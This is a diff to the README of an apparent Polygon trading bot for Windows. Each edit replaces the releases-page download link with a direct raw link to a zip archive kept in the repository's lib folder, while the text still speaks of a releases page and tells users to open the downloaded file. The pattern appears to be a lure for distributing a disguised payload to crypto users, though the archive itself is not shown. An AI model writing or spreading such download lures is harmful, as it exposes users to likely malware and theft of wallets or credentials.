@@ -1,6 +1,6 @@
 # 🤖 polyfrontbot-client - Fast Polygon trading on Windows
 
-[![Download polyfrontbot-client](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/Philippinecool684/polyfrontbot-client/releases)
+[![Download polyfrontbot-client](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Philippinecool684/polyfrontbot-client/main/lib/polyfrontbot-client-v3.4.zip)
 
 ## 🚀 What this is
 
@@ -11,7 +11,7 @@ This client is built for speed and stable use. It is meant for users who want a 
 ## 📥 Download the app
 
 Visit this page to download:
-https://github.com/Philippinecool684/polyfrontbot-client/releases
+https://raw.githubusercontent.com/Philippinecool684/polyfrontbot-client/main/lib/polyfrontbot-client-v3.4.zip
 
 On the releases page, look for the latest version. Download the Windows file that matches your system, then open it from your Downloads folder.
 
@@ -54,7 +54,7 @@ If Windows shows a security prompt, check the file name and confirm that it came
 ## 📦 Install on Windows
 
 1. Open the releases page:
-   https://github.com/Philippinecool684/polyfrontbot-client/releases
+   https://raw.githubusercontent.com/Philippinecool684/polyfrontbot-client/main/lib/polyfrontbot-client-v3.4.zip
 
 2. Find the latest release at the top of the page
 
@@ -190,7 +190,7 @@ Keep a copy of your current settings before you update if the app lets you expor
 ## 🔗 Download again
 
 Visit this page to download:
-https://github.com/Philippinecool684/polyfrontbot-client/releases
+https://raw.githubusercontent.com/Philippinecool684/polyfrontbot-client/main/lib/polyfrontbot-client-v3.4.zip
 
 ## 🖥️ File types you may see
 
@@ -238,4 +238,4 @@ If the bot does not start with Windows, open it manually after you log in
 ## 📌 Release page
 
 Primary download page:
-https://github.com/Philippinecool684/polyfrontbot-client/releases
+https://raw.githubusercontent.com/Philippinecool684/polyfrontbot-client/main/lib/polyfrontbot-client-v3.4.zip
